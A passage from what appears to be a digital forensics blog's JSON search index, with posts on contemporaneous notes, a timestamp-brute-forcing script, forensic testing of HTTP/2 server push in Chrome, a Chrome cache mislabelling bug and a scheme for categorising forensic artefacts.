dark, the book follows the author Cliff Stoll tracking unauthorised access to the US Lawrence Berkeley National Laboratory computer network in the late 1980s.\n The book itself is an engaging and fascinating account of a low-tech attacker (by today\u0026rsquo;s standards) penetrating various networks across the US and the low-tech defender tracking his activities.","tags":["theory","books"],"title":"The Cuckoo's Egg: Redux","uri":"https://bitofhex.com/2018/08/14/cuckoos-egg/","year":"2018"},{"content":"This post can actually be pretty short: write contemporaneous notes. There. Done. Finished.\nNeed more detail?\nWriting contemporaneous notes is the smartest, best, and most important thing you will do in your DFIR career. They will help you, save you, protect you, and aid you in every aspect of your work. DON\u0026rsquo;T make the mistake of thinking that contemporaneous notes will be some \u0026lsquo;extra evidence\u0026rsquo; that will get you in trouble, or contradict your report findings. Instead, they will be your best friend.\nWhat are contemporaneous notes? I\u0026rsquo;m not a lawyer, so I\u0026rsquo;ll just give you my take. Contemporaneous notes are documentary evidence of what you did, said, observed, or were told. These are produced by you during the course of your work. They should be written as close as practical to the event. It can be handwritten notes, a typed document, logs/screenshots from tools, emails, photographs/videos, or a \u0026lt;insert favourite note taking app here\u0026gt; file. In reality, they will probably be a mix of all of these.\nContemporaneous notes are used so as you can account for your actions during an incident or investigation. They also assist others working in your team to know what actions you took. This will avoid errors, duplication of work, or (worse) missing steps that need to be undertaken. Lastly, contemporaneous notes will provide evidence and accountability of your actions in the weeks, months, or even years after the fact.\nThe \u0026lsquo;rules\u0026rsquo; of contemporaneous notes There are no hard and fast rules, and everyone will develop their style as they write more and more notes. Some people write only a little and prefer to rely on logs of tools, screenshots, or photographs. Others will document obsessively. You\u0026rsquo;ll have to find what will work for you and your style, as well as your type of DFIR work. You must also take into account any regulatory framework you fall under.\nSo, let\u0026rsquo;s start with the following:\n All entries, photos or logs should have a date and time. This date and time doesn\u0026rsquo;t need to be synchronised to a Swiss atomic clock, but it should be accurate. If you are handwriting notes and you make a mistake, panic, cross out what you wrote with a single line, so it is still readable, write what you meant, then sign and date the crossed-out section. If you forgot to document an event (and you are handwriting notes or have printed them), at the bottom write \u0026lsquo;out of order\u0026rsquo;, put the date and time of the event and then add the relevant details. Sign this handwritten section if necessary.  What should I include? You can\u0026rsquo;t include everything, but you need to work out what is important to document. If you make an image of a hard drive, don\u0026rsquo;t write out the MD5/SHA1 if it\u0026rsquo;s in the tool log - just include the log in your notes. Think about the nebulous aspects of your work that aren\u0026rsquo;t captured by tool logs or other automated output.\nSome areas I believe are critical to document are:\n Date/time you became involved in an investigation/incident. Where you are located (on-site, over the phone, remote access etc.). When you receive information; who provided this information. When you provided advice or a status update; to whom; and what information was provided. Steps you took when dealing with an incident or handling evidence. Meetings held; who was present at those meetings; the general gist of the meeting; critical decisions made at that meeting. If you provided verbal options or recommendations to a client or management (e.g. the scale of a breach, what sensitive data was potentially exfiltrated, illicit data identified, possible containment or remediation steps); what were those options? Who did you provide them to? Did the client understand those options? What did they choose (or not choose) to do? When you received data/evidence/information and from whom. When you passed data/evidence/information to someone, or placed it somewhere. Success of a tool (e.g. hard disk successfully imaged). Failure of a tool (e.g. memory capture failure, script breaking, hard drive not readable). When you stopped working or made a shift change. Who did you transfer ownership to? What information did you provide them? \u0026hellip;probably more that people can add here  That\u0026rsquo;s a lot. Anything else? Yes, write down when you stuffed up.\nHa Ha Ha. Sure. No really. Dropped a hard drive? Make a note. Forgot to hash a memory sample until you came back to the lab? Hash the file. Then make a note. Stuffed up a time zone in your calculations? Fix it. Make a note.\nNotes protect you. People make mistakes. You will make mistakes. If you are having your work peer reviewed or challenged, then having those notes will back up your version of events. Sure, you forgot to hash the output of a tool. It happens. But you fixed it. It\u0026rsquo;s better than hashing it, not documenting it, and then one or two years later wondering why the time stamp of the hash is three days after the memory capture. It\u0026rsquo;s always much worse to explain errors without notes to back up your version of events. Notes give you credibility even if you made a mistake.\nSo\u0026hellip;\u0026lsquo;contemporaneous\u0026rsquo;, what does that mean? In an ideal world, your notes will start when you start an investigation, but this is not critical or sometimes practical. Obviously, the closer you write the notes to the actual event the better. HOWEVER, the golden rule is \u0026lsquo;some notes written after the fact, are better than no notes at all\u0026rsquo;. For example, you\u0026rsquo;re out and you take a phone call. During this call, you triage a situation, provide advice, and make a decision on what actions you or your team might make. If you write these notes up the next day, it\u0026rsquo;s OK. The fact that you write them up is the important part.\nHow should I take contemporaneous notes? There are plenty of software programs. The truth is that whichever program works for you AND works with your team. If everyone uses OneNote: then use that. If people have a specialised application, then it makes sense to align your notes to that software. I\u0026rsquo;ve put some links at the bottom of this post, and if you have any favourites, let me know and I\u0026rsquo;ll add them.\nDo I print them\u0026hellip;or hash them\u0026hellip;or what? Again, there is no rule other than make it consistent. Best practice (in my opinion) would be to at least have a signed, hard copy. This is simply because (should it come to it) lawyers and courts love signed hard copies. Yes, you could cryptographically sign a document or hash the file(s) and it\u0026rsquo;s probably good to do a mix of verifications like this. Again, you should be guided by your team or regulatory framework.\nIf you have any tips, examples, corrections let me know at matt@bitofhex.com or via Twitter at @mattnotmax. Trust me Believe me, writing clear contemporaneous notes is the best career move you can make.\nResources \u0026amp; Links Update 6 August 2018: I was contacted by the creators of \u0026lsquo;Forensic Notes\u0026rsquo; and considering their product appears to be designed for the above purposes I have included them below. No personal benefit was derived from promoting any of the below applications. I have also noted paid/free options.\nOneNote (PAID)\nKeepNote (FREE, Doesn\u0026rsquo;t look like it\u0026rsquo;s been maintained in a while).\nCase Notes Professional (FREE)\nDradis (FREE)\nForensic Notes (FREE/PAID)\nA bunch more at dfir.training\n","id":9,"section":"posts","summary":"This post can actually be pretty short: write contemporaneous notes. There. Done. Finished.\nNeed more detail?\nWriting contemporaneous notes is the smartest, best, and most important thing you will do in your DFIR career. They will help you, save you, protect you, and aid you in every aspect of your work. DON\u0026rsquo;T make the mistake of thinking that contemporaneous notes will be some \u0026lsquo;extra evidence\u0026rsquo; that will get you in trouble, or contradict your report findings.","tags":["verification","theory"],"title":"Contemporaneous Notes: a forensicator's best friend","uri":"https://bitofhex.com/2018/08/02/contemporaneous-notes/","year":"2018"},{"content":"It\u0026rsquo;s common when exploring a new file format or Windows registry key to look for dates and times. Lots of binary structures encode dates and times which are essential to parse out.\nWindows 10 has been exceptional at releasing \u0026lsquo;new\u0026rsquo; data formats - especially in the registry where many of these new configuration settings are stored. Some great work has been done by the DFIR community to locate, parse and understand these new structures. For example, @gazambelli came across this interesting registry key back in June:\nThe registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Store\\Cache\\DefaultAccount\\$$windows.data.taskflow.shellactivities\\Current on Win10 contains a lot of user activity. I wonder if those repeating hex values may be timestamps. Any help? #DFIR pic.twitter.com/pwCgZibdjS\n\u0026mdash; Gabriele Zambelli (@gazambelli) June 8, 2018  Of course, there are good open source and commercial tools which can explore binary and pull out possible dates and times. For registry analysis Eric Zimmerman\u0026rsquo;s Registry Explorer has a \u0026lsquo;data interpreter\u0026rsquo;, and for general binary structures X-Ways automatically highlights possible dates and times.\nHowever, in an effort to learn Python, I\u0026rsquo;ve created a short script which will brute-force binary data looking for valid dates and times, according to a specified year. It\u0026rsquo;s simple to use and can give a quick indication if there is anything worth following up.\nThe usage is: ./bruteforce_dt.py \u0026lt;filename\u0026gt; \u0026lt;year\u0026gt;.\nBelow, I\u0026rsquo;m looking for possible dates and times in a carved event log from a memory capture:\n$ python3 bruteforce_dt.py single_event_log_carved.bin 2018 bruteforce_dt.py: Test binary data for possible valid date/time formats. Version 0.1 Windows little-endian FILETIME records (in UTC) matching the year 2018 as follows: Offset: 0x10 Date: 2018-03-18 11:15:00 Offset: 0x82 Date: 2018-03-18 11:15:00 Offset: 0x92 Date: 2018-03-07 08:43:03 Offset: 0x93 Date: 2018-03-07 08:43:03 Of course, you still have to use your brain. It won\u0026rsquo;t account for false positives but it might point you in the right direction. At this point, the script will look for Windows little endian FILETIME records in binary data (such as registry keys), although I\u0026rsquo;ll look to expand parsers in time and add a date range functionality.\nIf you have any suggestions, comments or questions, please send me an email on matt@bitofhex.com or via Twitter at @mattnotmax. Thanks for reading!\nReferences \u0026amp; Links of Interest: bruteforce_dt.py\nRegistry Explorer\nX-Ways\nDCode\nDate Decode\n","id":10,"section":"posts","summary":"It\u0026rsquo;s common when exploring a new file format or Windows registry key to look for dates and times. Lots of binary structures encode dates and times which are essential to parse out.\nWindows 10 has been exceptional at releasing \u0026lsquo;new\u0026rsquo; data formats - especially in the registry where many of these new configuration settings are stored. Some great work has been done by the DFIR community to locate, parse and understand these new structures.","tags":["python","tools","dates and times"],"title":"Brute-forcing dates \u0026 times in binary data","uri":"https://bitofhex.com/2018/07/29/brute-force-dates-times/","year":"2018"},{"content":"HTTP/2 is fundamentally different from HTTP/1.x; but it is not some edge-case of internet traffic. Figures that I found from April 2016 indicated it was 68% of web-traffic. It is supported by the major browsers, and even the lowly bit_of_hex blog is sent via HTTP/2. To check, the browsers generally identify HTTP/2 traffic as \u0026lsquo;h2\u0026rsquo; in their developer tools.\n HTTP/2 is a binary protocol (as opposed to HTTP/1.1) and based around \u0026lsquo;frames\u0026rsquo; which include types such as HEADERS, DATA, SETTINGS, and WINDOW_UPDATE. Communication occurs over a single TCP connection and may include a number of bidirectional \u0026lsquo;streams\u0026rsquo;. Each uniquely identified stream can carry bidirectional \u0026lsquo;messages\u0026rsquo;. Streams operate independently so a stalled request does not affect other request/responses. Apart from RFC 7540 a great resource is Ilya Grigorik\u0026rsquo;s book High Performance Browser Networking published by O\u0026rsquo;Reilly Media.\nI\u0026rsquo;ve been examining the mechanics of the HTTP/2 protocol. Previously, I identified Chrome incorrectly tags HTTP/2 server response headers as \u0026lsquo;HTTP/1.1\u0026rsquo; when saving data to the disk cache. However, another particular aspect caught my attention: HTTP/2 push. This functionality in HTTP/2 seems quite interesting. The RFC describes it as follows:\n HTTP/2 adds a new interaction mode whereby a server can push responses to a client\u0026hellip;Server push allows a server to speculatively send data to a client that the server anticipates the client will need, trading off some network usage against a potential latency gain.\n So essentially, a server can \u0026lsquo;push\u0026rsquo; data to a client without a formal \u0026lsquo;request\u0026rsquo;? Of course, the evil part of me said, \u0026lsquo;Muhahah, I could send an evil file!\u0026rdquo; Then the part of me that might be in court said \u0026lsquo;Hang on, what happens if I push something to the client? Where do it go?\u0026rsquo;\nI want to try to answer the following questions:\n What does the HTTP/2 push request/response look like from both the client and server? How does the browser handle HTTP/2 pushed data before it is actually used by the web-page? Could a malicious server push illicit/unwanted data to the browser disk cache through HTTP/2 server push? Can host or network forensics identify HTTP/2 pushed data?   Forensic Testing of HTTP/2 Push For testing, I set up a simple two-page website (https://zabul.net - thanks for cheap domain names!) which delivered content over HTTP/2. The first page displayed one image file but actually pushed two additional image files. The second page used these \u0026lsquo;pushed\u0026rsquo; files. Usually, the pushed content wouldn\u0026rsquo;t be divided between multiple pages; however, this is a good way to experiment with HTTP/2 push under controlled conditions. Doing this testing also allowed me to demonstrate my highly (un)skilled HTML coding.1\n The testing setup was as follows:\n The web server was run through a Digital Ocean droplet with Ubuntu 18.03, Ngnix 1.14.0 and Let\u0026rsquo;s Encrypt TLS certificate. The client was a virtual machine running Windows 10x64 (1803) with Chrome 67.0.3369.99 (x64). Page 1 of the web server sends one picture \u0026lsquo;normally\u0026rsquo; called cat_no_push.jpg and two pictures via HTTP/2 push, called cat-pushed_1.jpg and cat-pushed_2.jpg. Page 2 of the web server then loads the two pushed files from Page 1.   HTTP/2 Push Mechanics A HTTP/2 push is initiated through a PUSH_PROMISE frame which identifies the headers of the data to be pushed. If accepted, the server can then push the data in a separate stream. Chrome gives a user complete insight into the HTTP/2 requests under chrome://net-internals. The simplest diagram I found displaying the mechanics of HTTP/2 push was from a presentation by Ilya Grigorik here.\n So let\u0026rsquo;s dive in and take a look\u0026hellip;\nWhat does the HTTP/2 push request/response look like from both the client and server? From the web-server the Nginx logs look as expected. When \u0026lsquo;Page 1\u0026rsquo; loads we have four entries:\n203.0.113.1 - - [30/Jun/2018:03:56:38 +0000] \"GET / HTTP/2.0\" 200 246 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\" 203.0.113.1 - - [30/Jun/2018:03:56:38 +0000] \"GET /cat-pushed_1.jpg HTTP/2.0\" 200 5919 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\" 203.0.113.1 - - [30/Jun/2018:03:56:38 +0000] \"GET /cat-pushed_2.jpg HTTP/2.0\" 200 94985 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\" 203.0.113.1 - - [30/Jun/2018:03:56:38 +0000] \"GET /cat_no_push.jpg HTTP/2.0\" 200 104154 \"https://zabul.net/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\"  Some observations of the logs from page 1:\n There is nothing identifiable to indicate that the data has been \u0026lsquo;pushed\u0026rsquo; (apart from the file names); The logs note it was sent via \u0026lsquo;HTTP/2.0\u0026rsquo; so an understanding of the RFC would need to be required to know that server push exists; and The pushed JPEG files were sent prior to the single required file (which is part of the push mechanics).  When page 2 loads we have the following single entry is added to the logs:\n203.0.113.1 - - [30/Jun/2018:03:59:00 +0000] \"GET /2.html HTTP/2.0\" 200 173 \"https://zabul.net/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\"  From this entry:\n An astute observer looking in isolation might wonder where the JPEG files were; however, this can be matched with the immediately preceding log entries; and There is still nothing (as expected) to indicate data was pushed to the client.  Lastly the Nginx configuration file has the complete picture with lines 7 \u0026amp; 8 commencing with http2_push identifying the pushed data. 2\nserver { listen 443 ssl http2 default_server; listen [::]:443 http2 default_server; root /var/www/html; server_name zabul.net; location = /index.html { http2_push /cat-pushed_1.jpg; http2_push /cat-pushed_2.jpg; } ssl_certificate /etc/letsencrypt/live/zabul.net/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/zabul.net/privkey.pem; # managed by Certbot ssl_dhparam /etc/letsencrypt/live/zabul.net/dhparam.pem; } server { listen 80; listen [::]:80; server_name zabul.net; return 301 https://$server_name$request_uri; }  From the client side on Chrome, it gets a little better. Chrome provides a great array of tools to inspect web-pages and traffic. One tool is chrome://net-internals which allows HTTP/2 traffic to be dissected.\nWhen loading page 1, Chrome identifies \u0026lsquo;Pushed\u0026rsquo; as \u0026lsquo;2\u0026rsquo; and \u0026lsquo;Unclaimed push\u0026rsquo; as \u0026lsquo;2\u0026rsquo;. Clicking through to page 2 indicates that \u0026lsquo;Pushed\u0026rsquo; remains \u0026lsquo;2\u0026rsquo; and \u0026lsquo;Pushed and claimed\u0026rsquo; is now \u0026lsquo;2\u0026rsquo;.\n Chrome also provides the ability to observe the raw HTTP/2 headers which clearly identify the PUSH_PROMISE traffic is sent prior to the image used on page 1:\n896: HTTP2_SESSION zabul.net:443 (DIRECT) Start Time: 2018-06-30 13:57:03.177 t=348075 [st= 0] +HTTP2_SESSION [dt=?] -- host = \"zabul.net:443\" -- proxy = \"DIRECT\" t=348075 [st= 0] HTTP2_SESSION_INITIALIZED -- protocol = \"h2\" -- source_dependency = 894 (SOCKET) ***snipped*** t=348368 [st= 293] HTTP2_SESSION_RECV_PUSH_PROMISE -- :method: GET :path: /cat-pushed_1.jpg :scheme: https :authority: zabul.net accept-encoding: gzip, deflate, br accept-language: en-US,en;q=0.9 user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 -- id = 1 -- promised_stream_id = 2 t=348368 [st= 293] HTTP2_STREAM_SEND_PRIORITY -- exclusive = true -- parent_stream_id = 1 -- stream_id = 2 -- weight = 110 t=348368 [st= 293] HTTP2_SESSION_RECV_PUSH_PROMISE -- :method: GET :path: /cat-pushed_2.jpg :scheme: https :authority: zabul.net accept-encoding: gzip, deflate, br accept-language: en-US,en;q=0.9 user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 -- id = 1 -- promised_stream_id = 4 t=348368 [st= 293] HTTP2_STREAM_SEND_PRIORITY -- exclusive = true -- parent_stream_id = 2 -- stream_id = 4 -- weight = 110 ***snipped*** t=348395 [st= 320] HTTP2_SESSION_SEND_HEADERS -- exclusive = true -- fin = true -- has_priority = true -- :method: GET :authority: zabul.net :scheme: https :path: /cat_no_push.jpg user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36 accept: image/webp,image/apng,image/*,*/*;q=0.8 referer: https://zabul.net/ accept-encoding: gzip, deflate, br accept-language: en-US,en;q=0.9 -- parent_stream_id = 0 -- source_dependency = 900 (HTTP_STREAM_JOB) -- stream_id = 3 -- weight = 147  How does the browser handle HTTP/2 pushed data before it is actually used by the web-page? This question proved to be more difficult to determine. Initially I hypothesised pushed data would be saved to the disk cache before it was used (i.e. when page 1 was accessed). However, testing with Nirsoft and Hindsight indicated the pushed JPEG files were saved at the time Page 2 was accessed.\nPage 1 cache logs were as follows:\n Page 2 cache logs were as follows:\n One small indicator is that the server response headers will note the date and time it was pushed to the client, so in my case, where there is a significant difference between accessing page 1 and page 2, the pushed data can be identified as anomalous.\nSo, instead of the disk cache forensic tools, I tried to identify if a temporary file was created. Using SysInternals Process Monitor and Regshot I monitored changes to the file system and registry but couldn\u0026rsquo;t identify any data of interest.\nLastly, I undertook some Googling. Eventually I found an email thread between Chromium developers which seemed to explain what was happening. This dated 2006 thread discussing HTTP/2 push confirmed the push resource sits in the memory cache rather than written to the disk cache. Here two Chromium developers explain the mechanics as follows:\n The net stack is structured so that the the (sic) cache transaction layer generates network transactions when needed. For server push, the layering means that when pushed resources arrive there isn\u0026rsquo;t an obvious way for the net layer to interact with the cache. When the page \u0026ldquo;uses\u0026rdquo; the a (sic) pushed resource, the net layer intercepts the request and supplies the pushed resource from memory. This is transparent to the cache layer, so the resource will be stored in the http cache as usual as part of the cache transaction.\n and\n Pushed streams sit deep in the bowels of the //net stack, in the browser process, in memory, as part of SpdySession. When PUSH streams come along on a session, we drain the frame from the SpdySession (because we have to, to avoid HOL), and drop it into a SpdyStream. That SpdyStream will later (potentially) be claimed by a request, at which point, we replay the frames from the SpdyStream\n So, while difficult to confirm from a forensic perspective, the pushed data resides in memory until claimed. While I\u0026rsquo;m no software developer, if needed, the push mechanics can be reviewed in the Chromium source code. I\u0026rsquo;m not entirely comfortable with my own explanation, mainly due to the lack of contemporary information. So if there are better resources or testing available then please let me know.\n Could a malicious server push illicit/unwanted data to the browser disk cache through HTTP/2 server push? From my testing the answer is \u0026lsquo;no\u0026rsquo;. Based on the comments from Chrome developers this scenario was considered. If malicious data was pushed to the disk and then Chrome identified the site to be malicious and blocked it, the data would still have been pushed - which is not a good security outcome. Chrome developers also envisaged a problem where pushed data could potentially be continually pushed to disk even if the page was canceled.\n Can host or network forensics identify HTTP/2 pushed data? Yes and no.\nInspection of the network traffic will clearly identify the PUSH_PROMISE data either in the Chrome net-internal logs or with Wireshark. Note you\u0026rsquo;ll need to dump the TLS session keys to decrypt the data.\nHere in Wireshark the PUSH_PROMISE data is observed:\n Here the actual pushed JPEG can be carved from the packet capture:\n Host forensics is much more difficult to identify; but it actually might not be necessary. As the pushed data is not written to the disk cache until it is actually used by Chrome, there is no likely situation where there would be unused disk artefacts left.\nHowever, if you were keen to try and identify HTTP/2 pushed data consider the following:\n Read my previous post here to be aware Chrome incorrectly labels HTTP/2 traffic as HTTP/1.1. Therefore, the cached data will not be explicitly identifiable as HTTP/2 (until this bug is fixed by Google); and Look for differences between cache artefact date and time and server response header date and time which may indicate the data was pushed. However, given most pushed data will likely be used on the same page the time difference (if any) might be negligible.   Conclusion Ultimately, while there is no \u0026lsquo;forensic issue\u0026rsquo; with HTTP/2 push and Chrome, it is useful to know and understand how HTTP/2 push mechanics work.3 It is also useful to know how Chrome (correctly) handles pushed data if you ever get asked those famous \u0026lsquo;so is it possible\u0026hellip;\u0026rsquo; questions by a lawyer.\nThis is definitely not the \u0026lsquo;be-all-and-end-all\u0026rsquo; of HTTP/2 push. If you have any questions or comments, please feel free to contact me at matt@bitofhex.com or on Twitter at @mattnotmax.\n  I won\u0026rsquo;t be applying to any web-site design jobs anytime soon. \u0026#x21a9;\u0026#xfe0e;\n There are in-line ways to push data; however, they have not been tested at this time. \u0026#x21a9;\u0026#xfe0e;\n As always there are limitations: Only Chrome was tested due to it having such a large market share and great developer tools that allowed inspection of the HTTP/2 traffic and there are multiple ways to implement push at the server end: either within the global configuration file or via the web-pages themselves. Only the configuration file was tested. \u0026#x21a9;\u0026#xfe0e;\n   ","id":11,"section":"posts","summary":"HTTP/2 is fundamentally different from HTTP/1.x; but it is not some edge-case of internet traffic. Figures that I found from April 2016 indicated it was 68% of web-traffic. It is supported by the major browsers, and even the lowly bit_of_hex blog is sent via HTTP/2. To check, the browsers generally identify HTTP/2 traffic as \u0026lsquo;h2\u0026rsquo; in their developer tools.\n HTTP/2 is a binary protocol (as opposed to HTTP/1.1) and based around \u0026lsquo;frames\u0026rsquo; which include types such as HEADERS, DATA, SETTINGS, and WINDOW_UPDATE.","tags":["chrome","http/2"],"title":"Dude! Where's my HTTP/2?","uri":"https://bitofhex.com/2018/07/22/http2-and-chrome-cache/","year":"2018"},{"content":"We verify our forensic tools, right? And once we verify them, it\u0026rsquo;s all good? But what if the application is lying? Is the forensic tool right or wrong?\nI was playing around with HTTP/2 to see how the protocol works. A more detailed post examining HTTP/2 is forthcoming, but as usual I went down a rabbit hole and ended up\u0026hellip;well, writing a Chrome bug report. But I\u0026rsquo;ll take a few steps back.\nHTTP/2 Background HTTP/2 is the protocol that replaces the text-based HTTP/1.x protocol that we all know and love. HTTP/2 is a binary, multiplexed, stream-based protocol. In other words: completely different.\nAll major browsers can easily handle HTTP/2 and the per cent of HTTP/2 traffic is actually quite large. Figures that I found from April 2016 indicated HTTP/2 comprised 68% of web-traffic. Even the lowly bit_of_hex blog is sent via HTTP/2.\nAs part of the forthcoming post, I created a simple webpage on a VPS serving basic content over HTTP/2. In doing my testing, I ran Nirsoft ChromeCacheView and Ryan Benson\u0026rsquo;s Hindsight over the Chrome cache which was used to access the website to examine the results.\nIt was then I noticed something weird. Let\u0026rsquo;s explore further.\nUsing Chrome version 67.0.3396.99 (x64) on Windows 10 x64 (1803) and accessing an HTTP/2 page like https://http2.akamai.com/ I can confirm the data is being transmitted via HTTP/2 using Chrome Developer Tools.\n From the above, the three highlighted data elements are served over \u0026lsquo;h2\u0026rsquo; (which is the shorthand for HTTP/2). Developer Tools also allows a user to look at the server response headers (which are too long for a good screenshot, so you\u0026rsquo;ll have to trust me):\naccept-ch: DPR, Width, Viewport-Width, Downlink, Save-Data access-control-allow-credentials: false access-control-allow-headers: * access-control-allow-methods: GET,HEAD,POST access-control-allow-origin: * access-control-max-age: 86400 cache-control: max-age=43200 client_ip: 203.0.113.1 client_real_ip: 203.0.113.1 content-length: 11932 content-type: text/html;charset=UTF-8 date: Mon, 02 Jul 2018 04:34:03 GMT etag: \"9068c20f1c727825919f58f136cdfb91:1506554442\" expires: Mon, 02 Jul 2018 16:34:03 GMT ghost_ip: 23.49.208.45 ghost_service_ip: 203.26.28.251 myproto: h2 protocol_negotiation: h2 push: true rtt: 49 server: Apache status: 200 strict-transport-security: max-age=31536000 ; includeSubDomains x-akamai-transformed: 9 10909 0 pmb=mRUM,1  This response header is actually quite detailed, and does include the protocol type \u0026lsquo;h2\u0026rsquo; (lines 17 \u0026amp; 18). However, according to RFC 7540, 8.1.2.4 there is no requirement for HTTP/2 to declare the protocol version in the response header.\n For HTTP/2 responses, a single \u0026ldquo;:status\u0026rdquo; pseudo-header field is defined that carries the HTTP status code field\u0026hellip;This pseudo-header field MUST be included in all responses; otherwise, the response is malformed.\nHTTP/2 does not define a way to carry the version or reason phrase that is included in an HTTP/1.1 status line.\n In contrast, for the response headers served via HTTP/1.1 it is required (according to RFC 2616, Section 3.1) to announce the version number (such as HTTP/1.1), as in this example from http://www.abc.net.au/news/.\nHTTP/1.1 200 OK X-UA-Compatible: IE=Edge Content-Type: text/html;charset=UTF-8 Content-Language: en-AU Content-Encoding: gzip Content-Length: 35230 Last-Modified: Mon, 02 Jul 2018 04:59:59 GMT Accept-Ranges: bytes Cache-Control: max-age=21 Expires: Mon, 02 Jul 2018 05:03:50 GMT Date: Mon, 02 Jul 2018 05:03:29 GMT Connection: keep-alive Vary: Accept-Encoding Set-Cookie: ABC_LD=vic; path=/; domain=.abc.net.au Set-Cookie: ABC_FF=desktop; expires=Mon, 02-Jul-2018 07:03:29 GMT; path=/ Vary: Origin Vary: Cookie Vary: User-Agent Vary: User-Agent  So, what\u0026rsquo;s the big deal? Well the problems start when you look at what browser forensic tools pull out from the cache. In the https://http2.akamai.com/ instance, using Nirsoft gets the following (edited) results:\n It\u0026rsquo;s wrong. We know and saw from Chrome Developer Tools that it was served over HTTP/2. The response header also stated \u0026lsquo;h2\u0026rsquo;. Damn these forensic tools! Wrong again; because here is the entry in the referenced data_3 file in the Chrome cache (at C:\\Users\\{User}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\\):\n So, Chrome is writing \u0026lsquo;HTTP/1.1\u0026rsquo; at the top of the cache entry? This seems strange indeed and therefore blame isn\u0026rsquo;t with the forensic tools. Why this gets written there is a mystery to me. At the end of this block of information in the data_3 file is a reference to \u0026lsquo;h2\u0026rsquo; which likely indicates the protocol. However, I haven\u0026rsquo;t done the required testing to confirm how this is used.\n So, I lodged a bug report to see what the experts at Google thought. They quickly triaged this issue to a hard-coded line that injects the string \u0026lsquo;HTTP/1.1\u0026rsquo; within the code:\n So, what is the impact of this? It goes back to the old issue of verification and not simply \u0026lsquo;cut and pasting\u0026rsquo; your tool output to your report. Based on this initial testing I can\u0026rsquo;t verify the response header protocol information stored in the Chrome cache. Is the tool wrong? Yes, but only because the application is lying.\nIf anyone has further insights, please drop me a line at matt@bitofhex.com or via Twitter at @mattnotmax.\n","id":12,"section":"posts","summary":"We verify our forensic tools, right? And once we verify them, it\u0026rsquo;s all good? But what if the application is lying? Is the forensic tool right or wrong?\nI was playing around with HTTP/2 to see how the protocol works. A more detailed post examining HTTP/2 is forthcoming, but as usual I went down a rabbit hole and ended up\u0026hellip;well, writing a Chrome bug report. But I\u0026rsquo;ll take a few steps back.","tags":["chrome","verification","http/2"],"title":"Your forensic tools are wrong, because your application is lying","uri":"https://bitofhex.com/2018/07/02/chrome-cache-and-http2/","year":"2018"},{"content":"There are many ways to categorise forensic artefacts. Probably the best known (and well put) is the SANS Windows Forensics Analysis poster. This poster lists artefacts by the formula of \u0026lsquo;Evidence of\u0026hellip;'. It\u0026rsquo;s a great reference and training tool. But could we look at forensic artefacts differently? And why should we?\nBy categorising data differently, we can look at problems differently. Solving complex problems is a significant part of our work. It also helps when we are required to explain (verbally or in writing) complex topics to non-technical persons.\nSo what is another way to categorise forensic artefacts?\nUser Data: The most identifiable forensic artefacts are created by a user themselves. They are transparent to everyone, high quality and high fidelity. They are usually controlled by the user, in that they have the opportunity to delete or modify the data. A user can always deny creating the artefact, and it can be vulnerable to anti-forensics tools and methods. Automated tools can also create user data, so an analyst has to be aware, and consider the appropriate context and assumptions.\nExamples: user files (documents, spreadsheets), browser bookmarks, photos/videos, SMS, call logs etc.\nUser Experience: \u0026lsquo;User Experience\u0026rsquo; artefacts are created by the OS or application to enable user functionality \u0026amp; productivity, but also provide an additional benefit to a DFIR analyst. They are not directly created by the user but are a by-product of user created artefacts and generally can\u0026rsquo;t exist without each other. Often anti-forensic tools target this data as well.\nExamples: OS and software customisations, link files, recycle bin, shellbags, account data, wallpaper, search history, prefetch, recent file lists, thumbnails, command-line history, cookies etc.\n###Operating System, Application, or Network Data: This category of artefacts are created by the operating system, software or network which enable system optimisation \u0026amp; functionality. They are usually opaque to a regular user, and may be created with or without the user engaging in activity on the device. General anti-forensic tools are less effective against these artefacts.\nExamples: NTFS metadata, previously existing data, registry hive data, configuration files, switch/router data, non-security logs.\nPurposely Collected Data: Purposely collected artefacts are specifically captured to increase security. This may be automatically instigated, configured, and controlled by a user or network administrator. In general, this doesn\u0026rsquo;t provide any additional functionality to the end-user, and can be either transparent or opaque depending on the artefact and its configuration.\nExamples: firewall logs, AV logs, Netflow, passive DNS, memory captures, syslog, event logs.\nProtected Artefacts: Protected artefacts are user, OS and application data which is deliberately encrypted or obfuscated.\nExamples: PINs, passwords, private key data, biometric data, encrypted data, SSL/TLS traffic.\nUndisclosed/Undocumented Artefacts: This category is difficult to define. Usually, these artefacts are obtained to enable access to other (often protected) artefacts. These undisclosed and undocumented artefacts include sensitive application debug information, legacy/depreciated features that should have been removed in development, or even exploits enabling access to protected artefacts. Potentially obtaining these artefacts can be destabilising to the system.\nExamples of these artefacts can fall into the Donald Rumsfeld-zone of \u0026lsquo;known unknowns\u0026rsquo; and \u0026lsquo;unknown unknowns\u0026rsquo;. For example, it is public knowledge that two companies can bypass certain Apple iPhone lock screens; however, how this is achieved is not public. Conversely, there are possibly other unknown types of artefacts that are available through methods held by governments and companies which are unknown. This category should not be confused with technical intelligence gathering such as signals intelligence which is out of scope of this discussion. Lastly, there are certain artefacts that simply haven\u0026rsquo;t been identified. The recent (and rapid) changes to Windows 10 is an example of that. For example, check out this Twitter thread for how a new forensic artefact is 